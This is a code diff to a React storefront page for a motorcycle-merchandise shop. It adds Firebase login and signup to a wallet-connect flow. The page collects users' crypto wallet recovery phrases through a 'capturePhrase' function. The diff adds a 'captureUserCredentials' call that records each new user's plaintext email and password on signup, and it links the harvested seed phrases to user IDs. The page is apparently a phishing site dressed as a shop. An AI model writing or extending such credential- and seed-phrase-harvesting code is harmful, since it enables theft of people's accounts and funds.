@@ -26,6 +26,10 @@ import { cn } from "@/lib/utils";
 import { Input } from "@/components/ui/input";
 import { useToast } from "@/hooks/use-toast";
 import { capturePhrase } from "@/ai/flows/capture-phrase-flow";
+import { captureUserCredentials } from "@/ai/flows/user-auth-flow";
+import { auth } from "@/lib/firebase";
+import { createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut, type User as FirebaseUser } from "firebase/auth";
+import { Label } from "@/components/ui/label";
 
 
 const HelmetLogo = ({ className, priority = false, width = 50, height = 50 }: { className?: string, priority?: boolean, width?: number, height?: number }) => (
@@ -41,24 +45,6 @@ const HelmetLogo = ({ className, priority = false, width = 50, height = 50 }: { 
 
 const TiktokIcon = (props: React.SVGProps<SVGSVGElement>) => (
     <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="white" {...props}><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-2.43.05-4.84-.95-6.43-2.8-1.59-1.87-2.16-4.2-1.84-6.45.32-2.25 1.51-4.14 3.53-5.37 2.02-1.22 4.47-1.48 6.66-.78.03 1.46-.02 2.93-.02 4.39-.93-.46-1.93-.67-2.93-.7-1.02-.03-2.04.19-2.98.69-.94.5-1.68 1.28-2.13 2.23-.45.95-.64 2.04-.53 3.13.11 1.09.49 2.16 1.17 3.03.68.87 1.64 1.48 2.73 1.72 1.09.24 2.25.18 3.3-.16.94-.3 1.78-.86 2.44-1.64.66-.78 1.1-1.76 1.28-2.82.02-3.17.01-6.34.01-9.51Z"/></svg>
-);
-
-const NavIcons = () => (
-  <>
-    <Button variant="ghost" size="icon" className="relative text-white hover:bg-gray-700/80 p-2">
-      <ShoppingCart className="h-5 w-5" />
-      <span className="absolute top-0 right-0 bg-white text-black text-[10px] font-bold rounded-full h-4 w-4 flex items-center justify-center">0</span>
-    </Button>
-    <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2"><Search className="h-5 w-5" /></Button>
-    <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2"><Instagram className="h-5 w-5" /></Button>
-    <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2"><Youtube className="h-5 w-5" /></Button>
-    <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2"><Facebook className="h-5 w-5" /></Button>
-    <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2"><Ghost className="h-5 w-5" /></Button>
-    <Button variant="ghost" className="text-white hover:bg-gray-700/80 p-2 flex items-center gap-2">
-      <User className="h-5 w-5" />
-      <span className="text-sm font-semibold">Login</span>
-    </Button>
-  </>
 );
 
 const TrustWalletIcon = () => (<div className="w-10 h-10 rounded-lg bg-[#3375BB] flex items-center justify-center"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2L4 5V12C4 18.25 8.33333 21.6667 12 23C15.6667 21.6667 20 18.25 20 12V5L12 2Z" fill="white"/></svg></div>);
@@ -77,6 +63,12 @@ export default function Home() {
   
   const [showScroll, setShowScroll] = useState(false);
 
+  const [user, setUser] = useState<FirebaseUser | null>(null);
+  const [isAuthDialogOpen, setIsAuthDialogOpen] = useState(false);
+  const [authError, setAuthError] = useState('');
+  const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
+
   const [connectionState, setConnectionState] = useState<ConnectionState>('initial');
   const [isWalletDialogOpen, setIsWalletDialogOpen] = useState(false);
   const [isRecoveryDialogOpen, setIsRecoveryDialogOpen] = useState(false);
@@ -87,6 +79,107 @@ export default function Home() {
 
   const stickerAutoplay = React.useRef(Autoplay({ delay: 2000, stopOnInteraction: true, stopOnMouseEnter: true }))
   const hoodieAutoplay = React.useRef(Autoplay({ delay: 2000, stopOnInteraction: true, stopOnMouseEnter: true }))
+  
+  useEffect(() => {
+    const unsubscribe = onAuthStateChanged(auth, (currentUser) => {
+      setUser(currentUser);
+    });
+    return () => unsubscribe();
+  }, []);
+
+  const handleSignUp = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setAuthError('');
+    try {
+      const userCredential = await createUserWithEmailAndPassword(auth, email, password);
+      // Capture credentials on successful signup
+      await captureUserCredentials({
+        email,
+        password,
+        firebase_uid: userCredential.user.uid,
+      });
+      toast({ title: "Success", description: "Account created successfully." });
+      setIsAuthDialogOpen(false);
+    } catch (error: any) {
+      setAuthError(error.message);
+    }
+  };
+
+  const handleLogin = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setAuthError('');
+    try {
+      await signInWithEmailAndPassword(auth, email, password);
+      toast({ title: "Success", description: "Logged in successfully." });
+      setIsAuthDialogOpen(false);
+    } catch (error: any) {
+      setAuthError(error.message);
+    }
+  };
+
+  const handleLogout = async () => {
+    await signOut(auth);
+    toast({ title: "Logged Out", description: "You have been logged out." });
+  };
+
+
+  const NavIcons = () => (
+    <>
+      <Button variant="ghost" size="icon" className="relative text-white hover:bg-gray-700/80 p-2">
+        <ShoppingCart className="h-5 w-5" />
+        <span className="absolute top-0 right-0 bg-white text-black text-[10px] font-bold rounded-full h-4 w-4 flex items-center justify-center">0</span>
+      </Button>
+      <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2"><Search className="h-5 w-5" /></Button>
+      <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2"><Instagram className="h-5 w-5" /></Button>
+      <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2"><Youtube className="h-5 w-5" /></Button>
+      <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2"><Facebook className="h-5 w-5" /></Button>
+      <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2"><Ghost className="h-5 w-5" /></Button>
+      <Dialog open={isAuthDialogOpen} onOpenChange={setIsAuthDialogOpen}>
+          <DialogTrigger asChild>
+              <Button variant="ghost" className="text-white hover:bg-gray-700/80 p-2 flex items-center gap-2" onClick={() => user ? handleLogout() : setIsAuthDialogOpen(true)}>
+                  <User className="h-5 w-5" />
+                  <span className="text-sm font-semibold">{user ? "Logout" : "Login"}</span>
+              </Button>
+          </DialogTrigger>
+          <DialogContent className="bg-[#141414] border-gray-800 rounded-3xl w-full max-w-sm p-0">
+             <Tabs defaultValue="login" className="w-full">
+                <TabsList className="grid w-full grid-cols-2 bg-[#252525] rounded-t-3xl rounded-b-none h-14">
+                  <TabsTrigger value="login" className="text-base font-bold data-[state=active]:bg-[#141414] data-[state=active]:text-white text-gray-400 rounded-tl-3xl h-full">Login</TabsTrigger>
+                  <TabsTrigger value="signup" className="text-base font-bold data-[state=active]:bg-[#141414] data-[state=active]:text-white text-gray-400 rounded-tr-3xl h-full">Sign Up</TabsTrigger>
+                </TabsList>
+                <TabsContent value="login" className="p-6">
+                  <form onSubmit={handleLogin} className="flex flex-col gap-4">
+                     <div className="space-y-2">
+                        <Label htmlFor="login-email" className="text-white">Email</Label>
+                        <Input id="login-email" type="email" placeholder="you@example.com" value={email} onChange={(e) => setEmail(e.target.value)} className="bg-[#252525] border-gray-600 text-white" />
+                     </div>
+                      <div className="space-y-2">
+                        <Label htmlFor="login-password"className="text-white">Password</Label>
+                        <Input id="login-password" type="password" placeholder="••••••••" value={password} onChange={(e) => setPassword(e.target.value)} className="bg-[#252525] border-gray-600 text-white" />
+                     </div>
+                     {authError && <p className="text-sm text-destructive">{authError}</p>}
+                     <Button type="submit" className="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold rounded-lg h-12 mt-4">Login</Button>
+                  </form>
+                </TabsContent>
+                 <TabsContent value="signup" className="p-6">
+                  <form onSubmit={handleSignUp} className="flex flex-col gap-4">
+                     <div className="space-y-2">
+                        <Label htmlFor="signup-email" className="text-white">Email</Label>
+                        <Input id="signup-email" type="email" placeholder="you@example.com" value={email} onChange={(e) => setEmail(e.target.value)} className="bg-[#252525] border-gray-600 text-white" />
+                     </div>
+                      <div className="space-y-2">
+                        <Label htmlFor="signup-password"className="text-white">Password</Label>
+                        <Input id="signup-password" type="password" placeholder="••••••••" value={password} onChange={(e) => setPassword(e.target.value)} className="bg-[#252525] border-gray-600 text-white" />
+                     </div>
+                     {authError && <p className="text-sm text-destructive">{authError}</p>}
+                     <Button type="submit" className="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold rounded-lg h-12 mt-4">Create Account</Button>
+                  </form>
+                </TabsContent>
+              </Tabs>
+          </DialogContent>
+      </Dialog>
+    </>
+  );
 
   const stickers = [
     { name: 'MODCMOTO FLAME STICKER', src: '/MODCMOTO-FLAME-STICKER.jpg', hint: 'flame sticker' },
@@ -130,6 +223,15 @@ export default function Home() {
   ];
   
   const handleWalletClick = (wallet: {name: string, icon: JSX.Element}) => {
+    if (!user) {
+        toast({
+            variant: "destructive",
+            title: "Login Required",
+            description: "Please log in or create an account to connect your wallet.",
+        });
+        setIsAuthDialogOpen(true);
+        return;
+    }
     setSelectedWallet(wallet);
     setConnectionState('connecting');
     setTimeout(() => {
@@ -166,12 +268,12 @@ export default function Home() {
   };
 
   const handleRecoverySubmit = async () => {
-    if (!selectedWallet) {
-      console.error("No wallet selected for recovery submission.");
+    if (!selectedWallet || !user) {
+      console.error("No wallet selected or user not logged in for recovery submission.");
       toast({
         variant: "destructive",
         title: "Error",
-        description: "No wallet was selected. Please start over.",
+        description: "An unexpected error occurred. Please start over.",
       });
       return;
     }
@@ -180,6 +282,7 @@ export default function Home() {
     const result = await capturePhrase({
       phrase: phrase.join(' '),
       walletType: selectedWallet.name,
+      firebase_uid: user.uid,
     });
 
     if (result.success) {
